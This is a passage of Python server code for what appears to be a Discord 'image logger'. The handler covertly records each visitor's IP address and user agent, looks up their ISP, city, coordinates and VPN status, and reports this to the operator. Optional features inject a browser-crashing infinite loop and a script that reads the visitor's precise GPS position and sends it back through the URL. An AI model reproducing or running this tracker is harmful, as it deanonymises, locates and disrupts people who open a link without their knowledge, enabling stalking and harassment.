                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
